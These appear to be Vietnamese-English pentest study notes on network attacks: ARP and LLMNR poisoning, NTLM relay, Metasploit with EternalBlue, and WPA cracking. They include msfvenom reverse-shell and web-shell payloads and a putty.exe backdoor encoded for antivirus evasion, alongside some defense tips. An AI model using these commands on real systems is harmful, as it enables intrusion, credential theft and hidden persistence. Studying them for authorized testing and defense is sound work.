# Network Attacks Deep Dive

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## 1. Wireshark & Traffic Analysis

### What – Traffic Analysis là gì?
Phân tích network packets để phát hiện credentials, sensitive data, attack patterns, hoặc C2 communication.

### How – Wireshark Filters

```wireshark
# Display filters (sau khi capture)
http.request.method == "POST"            # POST requests
http contains "password"                 # HTTP body chứa "password"
http.response.code == 200               # HTTP 200 OK
dns.qry.name contains "google"          # DNS queries
tcp.port == 443 && ip.addr == 1.2.3.4  # HTTPS to specific IP
!(arp || icmp || dns)                   # loại bỏ noise
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN flood detection
frame.len > 1000                         # large packets
smtp || pop || imap                      # email protocols (cleartext!)

# Tìm credentials trong HTTP:
http.request.method == "POST" && http.request.uri contains "login"

# Follow TCP stream: click packet → Analyze → Follow → TCP Stream
# → Xem toàn bộ HTTP conversation

# Statistics → Protocol Hierarchy: xem distribution protocols
# Statistics → Conversations: top talkers, lọc theo IP
# Statistics → IO Graphs: visualize traffic over time
```

### How – tcpdump Command Line

```bash
# Capture cơ bản
tcpdump -i eth0 -w capture.pcap                         # capture to file
tcpdump -i eth0 -nn -v                                  # verbose, no hostname resolve
tcpdump -i eth0 -A port 80                              # show ASCII payload

# Filter expressions
tcpdump host 192.168.1.100                              # traffic từ/đến IP
tcpdump port 443                                        # HTTPS
tcpdump 'tcp[tcpflags] & tcp-syn != 0'                 # SYN packets
tcpdump 'tcp[tcpflags] == tcp-syn'                      # chỉ SYN (SYN flood)
tcpdump '(tcp[13] & 2 != 0) and (tcp[13] & 16 = 0)'   # SYN không có ACK
tcpdump not port 22 and not port 53                     # loại SSH và DNS

# Extract từ pcap
tcpdump -r capture.pcap -A | grep -i "password\|user\|login\|token"

# Tshark (Wireshark CLI)
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.request.uri -e http.file_data
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | sort | uniq -c | sort -rn
```

---

## 2. ARP Poisoning Deep Dive

### How – ARP Protocol Mechanics

```
ARP Request / Reply:
1. PC-A muốn gửi packet đến 192.168.1.1 (Gateway)
2. PC-A không biết MAC của 192.168.1.1
3. PC-A broadcast ARP Request: "Who has 192.168.1.1? Tell 192.168.1.100"
4. Gateway reply: "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
5. PC-A lưu vào ARP cache: 192.168.1.1 → AA:BB:CC:DD:EE:FF

Vulnerability: ARP là stateless (không verify), accept bất kỳ reply
→ Attacker gửi unsolicited ARP reply: "192.168.1.1 is at ATTACKER_MAC"
→ PC-A lưu vào cache → traffic đến gateway đi qua Attacker
```

```bash
# Lab setup: Kali Linux / Parrot OS
# Kiểm tra current ARP cache
arp -n

# Enable IP forwarding (để traffic qua thay vì drop)
echo 1 > /proc/sys/net/ipv4/ip_forward
# Permanent:
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

# ARP Poisoning với arpspoof
# Terminal 1: poison victim
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
# "Nói với 192.168.1.100 rằng: tôi (attacker) là 192.168.1.1 (gateway)"

# Terminal 2: poison gateway  
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
# "Nói với gateway rằng: tôi là 192.168.1.100 (victim)"

# Terminal 3: capture traffic
tcpdump -i eth0 -nn -s0 host 192.168.1.100

# Dsniff: extract credentials từ sniffed traffic
dsniff -i eth0                # passwords từ FTP, Telnet, HTTP, POP, IMAP

# SSLStrip: downgrade HTTPS → HTTP
python sslstrip.py -l 8080   # listen on 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Bettercap: modern MITM framework
bettercap -iface eth0
# Commands:
net.probe on                  # discover hosts
arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
http.proxy on                 # intercept HTTP
https.proxy on                # intercept HTTPS (with SSLstrip)
```

### How – Detection & Defense

```bash
# Detect ARP Poisoning:
# 1. Kiểm tra duplicate MAC/IP
arp -n | awk '{print $3}' | sort | uniq -d
# → Nếu 2 IP cùng MAC → có thể bị poison

# 2. Kiểm tra ARP cache bất thường
arp -n | grep "192.168.1.1"
# nếu MAC của gateway thay đổi → suspicious

# 3. ARPwatch: monitor ARP changes
apt install arpwatch
arpwatch -i eth0              # alert khi ARP thay đổi

# Phòng thủ:
# 1. Static ARP entries (cho gateways quan trọng)
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# 2. Dynamic ARP Inspection (DAI) trên managed switches
# Cisco: ip arp inspection vlan 10

# 3. VPN: encrypt traffic → ARP poison không giúp attacker đọc được gì

# 4. 802.1X port authentication: chỉ trusted devices kết nối switch port
```

---

## 3. LLMNR / NBT-NS Poisoning

### What – LLMNR/NBT-NS là gì?
Link-Local Multicast Name Resolution (LLMNR) và NetBIOS Name Service (NBT-NS) là fallback name resolution khi DNS fail. **Windows mặc định bật**. Attacker có thể poison để capture NTLMv2 hashes.

### How – Responder Attack

```
Attack Flow:
1. User typo: \\FILESERVEER (sai) → DNS fail → broadcast LLMNR
2. Attacker nghe broadcast, trả lời: "FILESERVEER = tôi"
3. Windows tự động gửi NTLMv2 challenge/response authentication
4. Attacker capture hash → crack offline
```

```bash
# Responder: LLMNR/NBT-NS/MDNS poisoner
# Chạy trên Kali trong cùng subnet với victim
responder -I eth0 -rdwv
# -r: NBT-NS poisoning
# -d: DHCP injection
# -w: WPAD rogue proxy
# -v: verbose

# Responder tự động:
# → Poison LLMNR/NBT-NS broadcasts
# → Capture NTLMv2 hashes khi user/system connect

# Output: /var/log/responder/Responder-Session.log
# Hash format: Administrator::WORKGROUP:xxxx:yyyy:zzz

# Crack NTLMv2 hash
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt

# Relay attack (không cần crack nếu SMB signing disabled):
# Terminal 1: Responder (disable SMB và HTTP)
responder -I eth0 -P -v

# Terminal 2: ntlmrelayx.py (relay credentials đến target)
ntlmrelayx.py -tf targets.txt -smb2support
# → nếu user là admin trên target → dump SAM database → get all hashes

# Phòng thủ:
# 1. Disable LLMNR via Group Policy:
#    Computer Config → Admin Templates → Network → DNS Client
#    → Turn off multicast name resolution = Enabled
# 2. Disable NBT-NS:
#    Network Adapter → IPv4 Properties → Advanced → WINS tab
#    → Disable NetBIOS over TCP/IP
# 3. Enable SMB Signing: ngăn relay attack
# 4. Network segmentation
```

---

## 4. Metasploit Framework

### What – Metasploit là gì?
Metasploit là exploitation framework mã nguồn mở, cung cấp database exploit, payloads, và tools cho penetration testing.

### How – Metasploit Architecture

```
Metasploit Modules:
├── Exploits      : khai thác vulnerabilities để get shell
├── Payloads      : code chạy sau khi exploit thành công
│   ├── Singles   : self-contained, ổn định
│   ├── Stagers   : nhỏ, kéo về payload lớn hơn
│   └── Stages    : payload lớn (Meterpreter, VNC)
├── Auxiliaries   : scanning, enumeration, fuzzing (không tạo shell)
├── Post          : post-exploitation (enum, escalate, pivot)
└── Encoders      : bypass AV/IDS

Meterpreter: advanced payload
- Chạy trong memory (không write to disk)
- Encrypted communication
- Extensive post-exploitation: keylogger, screenshot, file transfer
```

```bash
# Metasploit console
msfconsole

# Search modules
search type:exploit name:eternalblue
search cve:2021-44228                  # Log4Shell
search platform:windows type:local    # Windows local exploits

# EternalBlue (MS17-010) ví dụ (chỉ trong lab):
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50               # target
set LHOST 192.168.1.10                # attacker IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Meterpreter commands:
sysinfo                               # system information
getuid                                # current user
getsystem                             # try privilege escalation
hashdump                              # dump password hashes
shell                                 # get OS shell

# Pivoting: attack network through compromised host
route add 10.0.0.0 255.255.255.0 1   # route traffic through session 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
run

# Post exploitation modules:
use post/multi/recon/local_exploit_suggester  # suggest local privesc
set SESSION 1
run

use post/windows/gather/credentials/credential_collector
use post/linux/gather/hashdump

# Persistent backdoor (use only in authorized tests):
use post/windows/manage/persistence
use post/linux/manage/cron_persistence
```

### How – Payloads & Msfvenom

```bash
# Generate payloads với msfvenom
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -f exe -o payload.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -f elf -o payload

# Inject vào existing binary (AV bypass)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 \
  -x putty.exe -k \           # inject vào putty.exe, keep original
  -e x86/shikata_ga_nai \     # encode để bypass AV
  -i 5 \                       # 5 iterations encoding
  -f exe -o putty_backdoor.exe

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.jsp

# Handler để nhận connection
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"
```

---

## 5. Wireless Network Attacks

### How – WPA2 Cracking

```bash
# 802.11 Monitor Mode
airmon-ng start wlan0              # enable monitor mode → wlan0mon
airmon-ng check kill               # kill processes using wireless

# Discover networks
airodump-ng wlan0mon               # scan all networks
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c 6: channel 6
# → chờ capture WPA2 4-way handshake

# Force re-authentication (deauth attack) để bắt handshake nhanh hơn
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# Gửi 10 deauth frames → client reconnect → bắt handshake

# Crack handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
hashcat -m 22000 capture.hc22000 rockyou.txt   # faster GPU cracking

# PMKID Attack (không cần client kết nối):
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -z pmkid.hash pmkid.pcapng
hashcat -m 22801 pmkid.hash rockyou.txt

# WPS Attack (nếu WPS bật):
wash -i wlan0mon                   # scan WPS-enabled APs
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv  # WPS PIN brute force

# Evil Twin AP:
hostapd-wpe hostapd.conf           # rogue AP với same SSID
# → capture enterprise WPA2 credentials (RADIUS)
```

### How – Bluetooth Attacks

```bash
# BLE (Bluetooth Low Energy) scanning
bluetoothctl
  scan on
  devices

# hcitool
hcitool scan                       # discover Bluetooth devices
hcitool lescan                     # BLE scan

# BlueSnarfing: unauthorized data access
btscanner                          # scan + fingerprint
obexftp -b DEVICE_MAC -p photo.jpg # OBEX file pull (old devices)

# Blueborne: 2017, Remote Code Execution via Bluetooth
# → không cần pairing, thực thi code từ xa nếu Bluetooth bật

# Phòng thủ:
# - Tắt Bluetooth khi không dùng
# - Không accept pairing requests lạ
# - Update firmware (Blueborne patches)
# - BLE: Secure Pairing mode (LESC)
```

---

## 6. Port Scanning Advanced

### How – Evasion Techniques

```bash
# Decoy scan: che giấu attacker IP
nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.1
# → packet có nhiều source IPs → khó phân biệt attacker thực

# Idle scan (zombie scan): hoàn toàn giấu IP attacker
# Cần tìm "zombie" host với predictable IP ID
nmap -sI zombie_host 192.168.1.1
# → dùng zombie để probe target, chỉ zombie IP xuất hiện trong logs

# Fragment packets: bypass stateless firewall
nmap -f 192.168.1.1                # 8-byte fragments
nmap --mtu 24 192.168.1.1          # custom MTU

# Slow scan: bypass rate-based IDS
nmap -T0 192.168.1.1               # Paranoid: 1 packet per 5 minutes
nmap --scan-delay 10s 192.168.1.1

# Source port manipulation:
nmap --source-port 53 192.168.1.1  # dùng DNS port → nhiều firewall cho phép

# Banner grabbing
nc -nv 192.168.1.1 22              # SSH banner
nc -nv 192.168.1.1 80              # HTTP banner
HEAD / HTTP/1.0\r\n\r\n

# Service fingerprinting
nmap -sV --version-intensity 9 192.168.1.1   # aggressive version detection
```

---

### Compare – MITM Attack Tools

| Tool | Protocol | Method | Best For |
|------|---------|--------|---------|
| arpspoof | ARP | ARP poisoning | Basic MITM |
| Bettercap | Multi | ARP/DHCP/DNS/HTTPS | Modern MITM, rich UI |
| Responder | LLMNR/NBT-NS | Name resolution poison | Windows credential capture |
| SSLStrip | HTTP/HTTPS | Downgrade attack | Cleartext credential capture |
| MITMf | Multi | ARP + various plugins | Older but feature-rich |
| EvilGinx2 | HTTPS | Reverse proxy | Phishing + credential + session |

### Trade-offs
- Deauth attacks: nhanh capture handshake nhưng disruptive, dễ bị phát hiện bởi WIDS
- Slow nmap scan: tránh IDS nhưng mất nhiều giờ; cân bằng tốc độ và stealth
- LLMNR Relay vs Crack: relay nhanh hơn (không cần crack) nhưng cần SMB signing disabled

### Real-world Usage
```bash
# Network reconnaissance workflow:
# 1. Discover live hosts
nmap -sn 192.168.1.0/24 -oN hosts.txt
# 2. Port scan live hosts
cat hosts.txt | grep "report for" | awk '{print $5}' > ips.txt
nmap -sV -sC -p- --min-rate 5000 -iL ips.txt -oA full_scan
# 3. Vulnerability scan
nmap --script vuln -iL ips.txt -oN vuln_scan.txt
# 4. Web discovery
cat full_scan.gnmap | grep "80/open\|443/open\|8080/open\|8443/open" \
  | awk '{print $2}' | httpx -status-code -title > web_hosts.txt
```

### Ghi chú – Chủ đề tiếp theo
> Active Directory Attacks – Kerberoasting, Pass-the-Hash, DCSync, BloodHound attack path analysis

---

*Cập nhật lần cuối: 2026-05-06*
